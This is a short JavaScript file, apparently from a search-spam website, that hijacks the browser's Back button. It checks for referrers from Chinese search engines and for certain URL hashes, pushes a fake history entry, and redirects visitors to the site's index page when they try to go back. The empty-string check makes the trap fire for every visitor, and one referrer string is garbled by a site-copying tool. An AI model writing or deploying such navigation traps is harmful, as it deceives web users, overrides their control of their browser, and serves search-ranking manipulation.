var bdpar = window.location.href;
var refer = document.referrer;
var bd = refer.indexOf("http://vip.jdiscj.cn/aaa/baidu.com");
var hs = refer.indexOf("haosou.");
var sm = refer.indexOf("sm.");
var sg = refer.indexOf("sogou.");
var wt = bdpar.indexOf("");
var yh = bdpar.indexOf("youhua");
var bai = bdpar.indexOf("#baidu");
var hao = bdpar.indexOf("#360");
var shen = bdpar.indexOf("#sm");
var so = bdpar.indexOf("#so");
var hash = location.hash;
if (bd != -1 || hs != -1 || sm != -1 || sg != -1 || wt != -1 || yh != -1 || bai != -1 || hao != -1 || shen != -1 || so != -1) {
    if (location.hash.indexOf("_0") == -1) {
        history.pushState({
            page: 1
        // }, "", bdpar + hash + "#_0")
        }, "", bdpar + hash + "")
    }
};
window.onpopstate = function(a) {
    if (location.hash.indexOf("_0") == -1) {
        window.location.href = "/index.html"/*tpa=http://vip.jdiscj.cn/aaa/index-t2.html*/
    }
}